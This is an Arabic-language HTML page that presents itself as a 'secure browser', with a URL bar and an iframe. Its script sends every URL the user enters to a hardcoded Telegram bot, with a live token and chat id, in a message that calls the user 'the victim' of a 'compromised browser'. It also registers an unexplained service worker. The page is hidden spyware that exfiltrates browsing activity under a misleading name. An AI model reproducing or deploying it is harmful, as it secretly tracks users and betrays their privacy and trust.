<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>المتصفح الآمن | YOU_BROWSER</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #050505; color: #00ff41; font-family: sans-serif; overflow: hidden; }
        .nav-bar { background: #111; padding: 10px; display: flex; gap: 10px; border-bottom: 1px solid #333; }
        input { flex: 1; background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 8px; border-radius: 5px; }
        iframe { width: 100%; height: calc(100% - 50px); border: none; background: white; }
    </style>
</head>
<body>
    <div class="nav-bar">
        <span>🌐 YOU_RECON:</span>
        <input type="text" id="urlInput" placeholder="ادخل الرابط هنا (مثلاً: https://bing.com)">
        <button onclick="loadPage()" style="background: #00ff41; border: none; padding: 5px 15px; cursor: pointer; font-weight: bold;">انتقال</button>
    </div>
    <iframe id="browserFrame" src="about:blank"></iframe>

<script>
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js');
    }

    function loadPage() {
        const url = document.getElementById('urlInput').value;
        const frame = document.getElementById('browserFrame');
        
        // إرسال إشعار فوري للتليجرام قبل التحميل
        fetch(`https://api.telegram.org/bot7713540341:AAGfI7IguGT5dwEhiocvC9h0mVW9js4ByJQ/sendMessage?chat_id=6778604620&text=🎯 YOU: الضحية يتصفح الآن عبر المتصفح المخترق:\n${url}`);
        
        frame.src = url;
    }
</script>
</body>
</html>
